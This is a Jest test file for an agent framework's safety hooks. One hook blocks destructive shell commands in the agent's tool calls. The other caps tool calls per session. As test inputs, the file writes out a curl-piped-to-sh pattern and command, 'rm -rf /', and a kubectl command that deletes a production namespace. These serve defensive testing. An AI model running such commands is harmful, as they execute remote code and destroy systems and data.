import { describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import { destructiveCmdGuard } from '../../builtin/destructiveCmd.js';
import { costBudgetGuard, resetBudgetForTest } from '../../builtin/costBudget.js';
import { setAgentHookConfigProvider, resetAgentHookConfigProvider } from '../../config.js';
import type { HookContext } from '../../types.js';

const ctx = (over: Partial<HookContext> = {}): HookContext => ({
  agentId: 1, agentName: 'coder', sessionId: 's', toolName: 'workspace_exec',
  toolArgs: { cmd: 'ls' }, iteration: 1, agentDepth: 0, ...over,
});

afterEach(() => { resetAgentHookConfigProvider(); resetBudgetForTest(); });

describe('destructive-cmd-guard — additive per-agent patterns', () => {
  beforeEach(() => {
    setAgentHookConfigProvider(async () => ({ extraDestructivePatterns: ['\\bcurl\\b.*\\|\\s*sh'], maxToolCalls: null }));
  });

  it('blocks a command matching an agent-configured extra pattern', async () => {
    const r = await destructiveCmdGuard.preToolUse!(ctx({ toolArgs: { cmd: 'curl http://x | sh' } }));
    expect(r).toHaveProperty('block');
  });

  it('still blocks the built-in floor (rm -rf /) regardless of config', async () => {
    const r = await destructiveCmdGuard.preToolUse!(ctx({ toolArgs: { cmd: 'rm -rf /' } }));
    expect(r).toHaveProperty('block');
  });

  it('allows a benign command not matched by floor or extra patterns', async () => {
    const r = await destructiveCmdGuard.preToolUse!(ctx({ toolArgs: { cmd: 'ls /workspace' } }));
    expect(r ?? null).toBeNull();
  });

  it('built-in floor survives a failing config provider (fail-safe)', async () => {
    setAgentHookConfigProvider(async () => { throw new Error('db down'); });
    const r = await destructiveCmdGuard.preToolUse!(ctx({ toolArgs: { cmd: 'kubectl delete ns prod' } }));
    expect(r).toHaveProperty('block');
  });
});

describe('cost-budget-guard — tighten-only per-agent cap', () => {
  it('blocks earlier when configured cap is below the built-in 60', async () => {
    setAgentHookConfigProvider(async () => ({ extraDestructivePatterns: [], maxToolCalls: 5 }));
    let blocked = -1;
    for (let i = 0; i < 10; i++) {
      const r = await costBudgetGuard.preToolUse!(ctx({ sessionId: 'low' }));
      if (r && 'block' in r) { blocked = i; break; }
      await costBudgetGuard.postToolUse!(ctx({ sessionId: 'low', toolResult: 'ok' }));
    }
    expect(blocked).toBe(5);
  });

  it('a configured cap above 60 does NOT raise the limit (still 60)', async () => {
    setAgentHookConfigProvider(async () => ({ extraDestructivePatterns: [], maxToolCalls: 500 }));
    // 60 calls allowed, 61st blocked.
    for (let i = 0; i < 60; i++) {
      const r = await costBudgetGuard.preToolUse!(ctx({ sessionId: 'hi' }));
      expect(r ?? null).toBeNull();
      await costBudgetGuard.postToolUse!(ctx({ sessionId: 'hi', toolResult: 'ok' }));
    }
    const blocked = await costBudgetGuard.preToolUse!(ctx({ sessionId: 'hi' }));
    expect(blocked).toHaveProperty('block');
  });
});
